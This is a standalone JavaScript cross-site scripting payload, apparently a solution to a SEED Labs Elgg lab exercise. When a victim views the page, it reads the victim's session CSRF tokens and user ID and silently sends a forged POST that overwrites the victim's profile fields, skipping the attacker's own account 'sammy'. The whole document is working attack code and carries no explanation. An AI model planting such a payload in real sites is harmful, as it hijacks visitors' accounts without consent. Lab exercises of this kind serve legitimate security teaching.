
<script type="text/javascript">
    window.onload = function(){
        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token="&__elgg_token=" + elgg.security.token.__elgg_token;
        
        let sammy_id = 59;
        let victim_id = elgg.session.user.guid;
        let victim_name = elgg.session.user.username;

        var sendurl = "http://www.seed-server.com/action/profile/edit";
        var content = "__elgg_token="+token +
                        "&__elgg_ts="+ts+
                        "&name="+victim_name+
                        "&description=<p>"+"1905101"+"</p> &accesslevel[description]=1"+
                        "&briefdescription=1905101&accesslevel[briefdescription]=1"+
                        "&location=randomlocation&accesslevel[location]=1"+
                        "&interests=Randomint&accesslevel[interests]=1"+
                        "&skills=Randomskill&accesslevel[skills]=1"+
                        "&contactemail=Randomabc@gmail.com&accesslevel[contactemail]=1"+
                        "&phone=Randomphone&accesslevel[phone]=1"+
                        "&mobile=RandomMobile&accesslevel[mobile]=1"+
                        "&website=http://www.random.com&accesslevel[website]=1"+
                        "&twitter=randomtwitter&accesslevel[twitter]=1"+
                        "&guid="+victim_id;

        if(victim_id != sammy_id){
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
